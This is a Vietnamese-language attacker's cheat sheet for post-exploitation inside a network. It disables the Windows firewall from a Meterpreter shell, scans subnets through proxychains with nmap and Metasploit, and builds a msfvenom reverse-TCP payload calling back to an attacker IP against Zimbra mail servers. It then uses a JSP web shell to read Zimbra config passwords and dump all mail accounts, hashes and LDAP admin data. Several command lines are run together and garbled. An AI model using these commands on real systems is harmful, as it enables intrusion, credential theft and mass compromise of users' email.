# 1. Tắt firewall
`meterpreter> shell
netsh advfirewall set allprofiles state off`

# 2. Scan nmap
`proxychains nmap -sn -PS22,80,443,445,3389 --disable-arp-ping -T4 <subnet>`

Ngoài ra:
ICMP only (nhanh, catch host block TCP/UDP):text `proxychains nmap -sn -PE -T4 10.0.0.0/8`

UDP only (cho host chỉ mở UDP như DNS/VPN):text `proxychains nmap -sn -PU53,67,123,161,500 -T4 10.0.0.0/8  #`

Full port scan (chậm, nhưng confirm chắc chắn nếu host sống mà không ping):text`proxychains nmap -p- -Pn -T3 10.0.0.0/8`  # etc. (dùng -T3 để chậm hơn, tránh drop)

`proxychains nmap -sT -Pn -p- -T4 --open 169.254.37.128
proxychains nmap -sT -Pn -p 22,80,135,139,445,3389,1433,3389,5357 --open 10.10.10.0/24`

# 3. Dùng metasploit
1. arp_sweep: `meterpreter> run arp_sweep -r 192.128.25.0/24`
2. `meterpreter> run portscan/tcp -r 192.128.25.0-254 -p 22,80,135,139,445,3389,1433,3389`
3. msf6> `use auxiliary/scanner/discovery/udp_sweep`
`set SESSION <id> (ví dụ 1)  
set RHOSTS 192.128.25.0/24  
set THREADS 100  
run`
4. msf6 >`use auxiliary/scanner/discovery/ipv4_ping  
set SESSION <id>  
set RHOSTS 192.128.25.0/24  
run`
5. msf6 >`use auxiliary/scanner/smb/smb_version  
set SESSION <id>  
set RHOSTS 192.128.25.0/24  
set THREADS 255  
run`

# 4. mail server
`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.19.182.171 LPORT=443 -f elf -o zimbra.elf` Dùng cho Zimbra 8/9, chạy trực tiếp `./zimbra.elf` → session

Handler
`
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 443
exploit -j
`

# 5, Mail-server account
`lang.jsp?cmd=cat /opt/zimbra/conf/localconfig.xml`
→ Kết quả sẽ hiện ngay trên trình duyệt, bạn sẽ thấy:

zimbra_ldap_password → LDAP admin
zimbra_mysql_password → MySQL root
ldap_root_password → LDAP root


`zmsoap -z -p PASS_BẠN_VỪA_LẤY GetAllAccountsRequest` → dump hết mail user

`zimbra_mysql_passwordmysqldump -u root -pPASS_BẠN_LẤY zimbra zimbra accounts > /tmp/mail_users.txt` → lấy hết email + NTLM hashldap_root_password

Dùng ldapsearch từ Kali: `ldapsearch -x -H ldap://IP -D "cn=config" -w PASS_BẠN_LẤY -b "" -s base` → domain admin thường nằm đây
